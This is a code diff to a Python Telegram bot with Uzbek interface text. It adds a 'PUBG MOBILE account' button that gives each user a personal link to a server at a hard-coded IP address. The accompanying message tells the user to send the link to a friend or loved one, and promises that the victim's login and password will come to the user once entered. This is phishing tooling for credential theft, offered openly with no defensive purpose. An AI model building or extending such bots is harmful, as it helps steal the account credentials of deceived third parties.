@@ -31,7 +31,8 @@ def start(update,context):
     """
     k=[
         [KeyboardButton("📇 Link 🌐"),KeyboardButton("🧬 Tugmali Link 🌐")],
-        [KeyboardButton("🫂 Bizning kanal obuna bolib qoying 😁")]
+        [KeyboardButton("🫂 Bizning kanal obuna bolib qoying 😁")],
+        [KeyboardButton("PUBG MOBILE 🖤 accaunt")],
     ]
     reply_markup=ReplyKeyboardMarkup(k,resize_keyboard=True)
     update.message.reply_text(text,parse_mode="Markdown",reply_markup=reply_markup)
@@ -87,6 +88,17 @@ def text(update,context):
         ]
         update.message.reply_text("Ishtimoiy tarmoqlarimiz 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
         update.message.reply_text("Obuna bolib qoying 🐬")
+
+    elif text=="PUBG MOBILE 🖤 accaunt":
+        text=f"""
+        ➡️ *http://13.60.29.35:8000/Pubg/{update.message.from_user.id}* ⬅️
+        \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
+        \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
+        """
+        update.message.reply_text(text,parse_mode="Markdown")
+        update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Pubg/449766528` ni ustiga bos",
+                                  parse_mode="Markdown")
+
     else:
         text = f"""
         ➡️ *http://13.60.29.35:8000/Nakrutka/{update.message.from_user.id}* ⬅️
